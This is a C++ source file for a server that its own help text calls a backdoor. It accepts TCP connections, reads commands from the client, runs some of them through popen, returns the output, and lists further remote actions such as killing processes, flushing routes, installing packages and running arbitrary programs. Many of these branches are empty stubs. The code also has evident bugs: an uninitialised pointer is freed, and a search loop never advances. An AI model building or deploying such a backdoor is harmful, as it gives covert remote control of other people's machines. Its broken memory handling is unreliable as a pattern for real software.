#include "BDServer.h"

/*
  Default constructor, initiates a default port number
*/
BDServer :: BDServer(){
  _PortNo = DEFAULT_PORTNO;

  //initialize server socket and client socket to known state
  _ServerSocket = 0;
  _ClientSocket = 0;
}

/*
  Alternative constructor, given a port number it will set the specified
  port number as long as the port number falls in a valid range.

  Otherwise, default port is specified.
*/
BDServer :: BDServer(int portNo){
  if(portNo > 256 && portNo <= 65535){
    _PortNo = portNo;
  }else{
    _PortNo = DEFAULT_PORTNO;
  }

  //initialize server socket and client socket to known state
  _ServerSocket = 0;
  _ClientSocket = 0;

}

/*
  startServer

  initializes the server socket then waits for a connection
*/
void BDServer :: startServer(){

  _ServerSocket = socket(AF_INET, SOCK_STREAM, 0);
  _ServerAddress.sin_family = AF_INET;
  _ServerAddress.sin_port = htons(_PortNo);
  _ServerAddress.sin_addr.s_addr = inet_addr("127.0.0.1");
  memset(_ServerAddress.sin_zero, '\0', sizeof _ServerAddress.sin_zero);

  bind(_ServerSocket, (struct sockaddr *) &_ServerAddress, sizeof(_ServerAddress));

  waitForConnection();
}

void BDServer :: waitForConnection(){
  char buffer[1024];

  if (_ServerSocket > 0){
    if(listen(_ServerSocket, 1) == 0){
      printf("Listening\n");
    }

    /* accept call creates a new socket for incomming connection */
    _AddrSize = sizeof _ServerStorage;
    _ClientSocket = accept(_ServerSocket, (struct sockaddr *) &_ServerStorage, &_AddrSize);

    printf("Client connected. Handshaking.\n");

    strcpy(buffer, "Server: Connected.\n");
    write(_ClientSocket, buffer, strlen(buffer));
    //once a conncetion has been made, wait for a command
    waitForCommand();
  }else{
    printf("Initialize server socket first ya dunce");
  }
}

/*
  waitForCommand

  waitForCommand assumes that a TCP connection has been made to a client.
  It then waits for a command to be sent from the client to parse
*/
void BDServer :: waitForCommand()
{
  int amountRead;
  char buffer[MAX_PATH];

  printf("Waiting for command...\n");
  memcpy(buffer, "-----------------------------------------------\n>> \0", 53);
  write(_ClientSocket, buffer, 53);
  memset(buffer, 0, MAX_PATH);
  amountRead = read(_ClientSocket, buffer, MAX_PATH);
  while(amountRead > 0){
    trimLeft(buffer, strlen(buffer));
    trimRight(buffer, strlen(buffer));
    if (amountRead == 1){
      try{
	memcpy(buffer, "Empty command\n", 14);
	write(_ClientSocket, buffer, 14);
      }catch(const std::exception& e){
	//client has disconnected
	break;
      }
    }else if(strncmp(buffer, "off", strlen(buffer)) == 0){
      memcpy(buffer, "Shutting down.\n", 15);
      write(_ClientSocket, buffer, 14);
      return;
    }else if(strncmp(buffer, "help", strlen(buffer)) == 0){
      helpMenu();
    }else{
      //executeCommand(buffer);
      parseCommand(buffer);
      printf("Waiting for command...\n");
    }
    
    memcpy(buffer, "\n-----------------------------------------------\n>> \0", 55);
    write(_ClientSocket, buffer, 55);
    memset(buffer, 0, MAX_PATH);
   
    amountRead = read(_ClientSocket, buffer, MAX_PATH);
  }

  printf("Client disconnected. Resetting client socket.\n");
  resetConnection();
  waitForConnection();
}

/*
  parseCommand

  parses commannds
*/

void BDServer :: parseCommand(char* command){
  char* cpy;
  char* function;
  char* arguments;

  trimLeft(command, strlen(command));
  trimRight(command, strlen(command));

  //strtok modifies the past in string - make a copy.
  cpy = (char*)malloc(strlen(command));
  memcpy(cpy, command, strlen(command));
  
  //extract function - first characters up to space or tab
  function = strtok(cpy, " \t");

  printf("after strtok1: %s\n", cpy);
  
  arguments = strtok(NULL, " \t");

  //if next strtok read on NULL is NULL then there are no arguments (nothing following function)
  if(arguments == NULL){
    if(strcmp(function, "cd") == 0){
      //cd with no arguments, switch to home directory
      printf("cd no arguments\n");
    }else if(strcmp(function, "ls") == 0){
      //ls with no
      printf("ls no arguments\n");
    }else if(strcmp(function, "ll") == 0){
      memcpy(cpy, "ls -FGlAihp\0", 12);
      executeCommand(cpy);
    }else if(strcmp(function, "pwd") == 0){
      printWorkingDirectory();
    }else if(strcmp(function, "who") == 0){
      
    }else if(strcmp(function, "net") == 0){
      
    }else if(strcmp(function, "ps") == 0){
      
    }else{
      badFunction(command);
    }
  }else{
    if(strcmp(function, "cd") == 0){
      changeDirectory(arguments);
    }else if (strcmp(function, "ls") == 0){
      executeCommand(command);
    }else if (strcmp(function, "cat") == 0){
      
    }else if (strcmp(function, "kill") == 0){
      
    }else if (strcmp(function, "nmap") == 0){
      
    }else if (strcmp(function, "netstat") == 0){
      
    }else if (strcmp(function, "route") == 0){
      
    }else if (strcmp(function, "chmod") == 0){
      
    }else if (strcmp(function, "apt-get") == 0){

    }else{
      badFunction(command);
    }  
  }

  free(cpy);
}

void BDServer :: badFunction(char *command)
{
  char *placeholder;
  char *output = (char*)malloc(MAX_PATH * sizeof(char));
  
  memcpy(output, command, strlen(command));
  output += strlen(command);
  memcpy(output, ": is not a valid command.\n", 26);
  output = placeholder;

  free(output);
}



/*
  executeCommand

  executeCommand takes in a command and executes it and redirects the output
  of the response so that the output can be sent to the client socket.

*/
void BDServer :: executeCommand(char* command)
{
  FILE *fp;
  char path[MAX_PATH];
  char *output = (char*)malloc(MAX_PATH * sizeof(char));
  char *placeholder = output;

  printf("%s\n", command);

  fp = popen(command, "r");
  if(fp != NULL){
    while(fgets(path, sizeof(path), fp) != NULL){
      printf("%s\n", path);
      memcpy(output, path, strlen(path));
      output += strlen(path) + 1;
      //write(_ClientSocket, path, MAX_PATH);
      memset(path, 0, MAX_PATH);
    }
  }else{
    printf("Bad command\n");
  }
  
  output = placeholder;
  
  fclose(fp);
  
  write(_ClientSocket, output, MAX_PATH);
  memset(output, 0, MAX_PATH);
  free(output);
}

void BDServer :: helpMenu(){
  printf("Printing command list and descriptions...\n");
  char buffer[MAX_PATH];
  memcpy(buffer, "Command listings:\n"
	 "-----------------------------------------------\n"
	 "pwd							- print working directory\n"
	 "cd <dir>						- change directory to <dir>\n"
	 "ls							- list the contents of the current working directory\n"
	 "ll 							- (ls -FGlAihp) more detailed ls\n"
	 "cat <file>						- return contents of <file>\n"
	 "who							- list currently logged in users\n"
	 "net							- show current network configuration\n"
	 "ps							- show currently running processes\n"
	 "kill -9 <pid> 						- kill process <pid>\n"
	 "nmap <params>						- run nmap with <params>\n"
	 "netstat -r 						- Display routing table\n"
	 "route flush 						- flush routing tables\n"
	 "route add -net <ipaddr> gw <gateway> 			- Add a route to the table through <ipaddr>, <gateway>\n"
	 "ext <program> <params>					- run <program> with <parameters>\n"
	 "chmod <permissions> <file>				- change <file> accessibility to <permissions>\n"
	 "apt-get install <pkg> 					- Install <pkg>\n\n"
	 "help							- print this list of commands\n"
	 "off							- terminate the backdoor program\n"
	 "-----------------------------------------------\n\n\0", 1046);
  write(_ClientSocket, buffer, strlen(buffer)-1);
  memset(buffer, 0, MAX_PATH);
}

/*
  printWorkingDirectory

  prints the working directory, else tells user bad
 */
void BDServer :: printWorkingDirectory(){
  char dir[1024];
  printf("%d\n", sizeof(dir));
  if (getcwd(dir, sizeof(dir)) != NULL){
    write(_ClientSocket, dir, strlen(dir));
  }else{
    printf("Bad dir\n");
    memcpy(dir, "Bad directory\n", 14);
    write(_ClientSocket, dir, 14);
  }
}

void BDServer :: changeDirectory(char *directory){
  int ret = chdir(directory);
  char buffer[1024] = "Bad directory\n\0";
  if (ret == -1){
    write(_ClientSocket, buffer, strlen(buffer));
  }else{
    printWorkingDirectory();    
  }
}


void BDServer :: resetConnection(){
  close(_ClientSocket);

  _ClientSocket = 0;
}


/* Getters/Setters */
void BDServer :: setPort(int port){
  if(port > 256 && port <= 65535){
    _PortNo = port;
  }
}

int BDServer :: getPort(){
  return _PortNo;
}

void BDServer :: trimLeft(char *input, int length){
  int index = 0, i = 0;

  while(index < length && (input[index] == ' ' || input[index] == '\n' || input[index] == '\t')){
    index ++;
  }

  while(i + index < length){
    input[i] = input[i + index];
    i++;
  }

  input[i] = '\0';
}

void BDServer :: trimRight(char *input, int length){
  int index = length - 1;

  while(index > 0 && (input[index] == ' ' || input[index] == '\n' || input[index] == '\t')){
    input[index] = '\0';
    index --;
  }
}

bool BDServer :: contains(char *input, char ch){
  int i = 0;
  bool found = false;
  while(i < strlen(input) && !found){
    if(input[i] == ch)
      found = true;
  }

  return found;
}
